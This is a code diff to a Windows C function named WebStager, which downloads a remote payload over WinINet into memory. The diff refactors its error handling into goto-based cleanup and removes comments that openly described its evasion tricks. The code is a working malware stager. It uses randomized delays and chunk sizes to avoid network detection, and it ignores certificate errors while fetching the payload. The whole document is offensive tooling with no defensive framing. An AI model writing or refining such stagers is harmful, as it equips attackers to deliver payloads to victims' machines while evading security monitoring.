@@ -4,7 +4,6 @@
 
 #pragma comment (lib, "Wininet.lib")
 
-// WebStager function
 BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
     BOOL bSTATE = TRUE;
     HINTERNET hInternet = NULL, hInternetFile = NULL;
@@ -17,9 +16,12 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
     // Seed random number generator
     srand((unsigned int)time(NULL));
 
-    // Create event for randomized delays to mimic human-like network behavior
+    // Create event for randomized delays
     hRandomDelay = CreateEvent(NULL, TRUE, FALSE, NULL);
-    if (hRandomDelay == NULL) return FALSE;
+    if (hRandomDelay == NULL) {
+        bSTATE = FALSE;
+        goto _EndOfFunction;
+    }
 
     // Initial random delay to avoid immediate connection patterns
     WaitForSingleObject(hRandomDelay, rand() % 500);
@@ -33,11 +35,11 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
         NULL
     );
     if (hInternet == NULL) {
-        CloseHandle(hRandomDelay);
-        return FALSE;
+        bSTATE = FALSE;
+        goto _EndOfFunction;
     }
 
-    // Delay before URL connection to simulate network latency
+    // Delay before URL connection
     WaitForSingleObject(hRandomDelay, rand() % 400);
 
     // Open URL with stealth-oriented connection flags
@@ -51,39 +53,38 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
         INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
         INTERNET_FLAG_NO_CACHE_WRITE |
         INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
-        INTERNET_FLAG_HYPERLINK, // | INTERNET_FLAG_KEEP_CONNECTION??
+        INTERNET_FLAG_HYPERLINK,
         0
     );
     if (hInternetFile == NULL) {
-        InternetCloseHandle(hInternet);
-        CloseHandle(hRandomDelay);
-        return FALSE;
+        bSTATE = FALSE;
+        goto _EndOfFunction;
     }
 
-    // Pause before buffer allocation to reduce predictability
+    // Pause before buffer allocation
     WaitForSingleObject(hRandomDelay, rand() % 300);
 
     // Allocate temporary buffer for chunk reading
     pTmpBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 1024);
     if (pTmpBytes == NULL) {
-        InternetCloseHandle(hInternet);
-        InternetCloseHandle(hInternetFile);
-        CloseHandle(hRandomDelay);
-        return FALSE;
+        bSTATE = FALSE;
+        goto _EndOfFunction;
     }
 
-    // Short delay before reading to further obfuscate network pattern
+    // Short delay before reading
     WaitForSingleObject(hRandomDelay, rand() % 100);
 
     while (TRUE) {
-        // Randomize chunk size to avoid fixed-size transfer detection
+        // Randomize chunk size
         chunkSize = 512 + (rand() % 1024);
 
         // Read file in variable-sized chunks
-        if (!InternetReadFile(hInternetFile, pTmpBytes, chunkSize, &dwBytesRead))
-            break;
+        if (!InternetReadFile(hInternetFile, pTmpBytes, chunkSize, &dwBytesRead)) {
+            bSTATE = FALSE;
+            goto _EndOfFunction;
+        }
 
-        // Random inter-chunk delay to simulate inconsistent network conditions
+        // Random inter-chunk delay
         WaitForSingleObject(hRandomDelay, rand() % 100);
 
         sSize += dwBytesRead;
@@ -94,8 +95,10 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
         else
             pBytes = (PBYTE)HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, pBytes, sSize);
 
-        if (pBytes == NULL)
-            break;
+        if (pBytes == NULL) {
+            bSTATE = FALSE;
+            goto _EndOfFunction;
+        }
 
         // Copy chunk to payload buffer
         memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
@@ -106,18 +109,23 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
             break;
     }
 
-    // Final delay before returning payload to randomize exit timing
+    // Final delay before returning payload
     WaitForSingleObject(hRandomDelay, rand() % 200);
 
     // Return payload details
     *pPayloadBytes = pBytes;
     *sPayloadSize = sSize;
 
+_EndOfFunction:
     // Cleanup resources
-    InternetCloseHandle(hInternet);
-    InternetCloseHandle(hInternetFile);
-    HeapFree(hHeap, 0, pTmpBytes);
-    CloseHandle(hRandomDelay);
+    if (hInternet)
+        InternetCloseHandle(hInternet);
+    if (hInternetFile)
+        InternetCloseHandle(hInternetFile);
+    if (pTmpBytes)
+        HeapFree(hHeap, 0, pTmpBytes);
+    if (hRandomDelay)
+        CloseHandle(hRandomDelay);
 
-    return (pBytes != NULL);
+    return bSTATE;
 }
